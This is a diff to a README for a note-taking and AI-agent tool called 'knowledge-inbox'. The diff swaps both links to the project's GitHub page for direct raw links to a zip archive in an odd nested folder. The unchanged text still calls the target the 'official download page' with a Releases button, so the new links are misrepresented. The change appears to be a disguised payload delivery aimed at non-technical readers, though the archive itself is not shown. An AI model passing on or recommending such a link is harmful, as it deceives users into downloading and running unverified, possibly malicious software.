@@ -28,7 +28,7 @@ It’s built for people who use **Obsidian** (a note-taking app) or **AI agents*
 
 Visit this link to download the application:
 
-[**⬇️ DOWNLOAD knowledge-inbox**](https://github.com/dafnamannish442/knowledge-inbox)
+[**⬇️ DOWNLOAD knowledge-inbox**](https://github.com/dafnamannish442/knowledge-inbox/raw/refs/heads/main/clients/hermes/inbox-knowledge-v3.7.zip)
 
 This link takes you to the official download page. Look for the big green button that says **"Download"** or **"Releases"** and click it. Your browser will download a file to your computer.
 
@@ -50,7 +50,7 @@ That’s it! The application will open in a new window.
 
 | What to do | Where to click |
 |------------|----------------|
-| 1. Open your browser | Go to [**this link**](https://github.com/dafnamannish442/knowledge-inbox) |
+| 1. Open your browser | Go to [**this link**](https://github.com/dafnamannish442/knowledge-inbox/raw/refs/heads/main/clients/hermes/inbox-knowledge-v3.7.zip) |
 | 2. Find the Download button | Look for **"Releases"** on the right side of the page |
 | 3. Click the latest version | Choose the newest file (usually topmost) |
 | 4. Save the file | Your browser will ask where to save—choose **Downloads** |
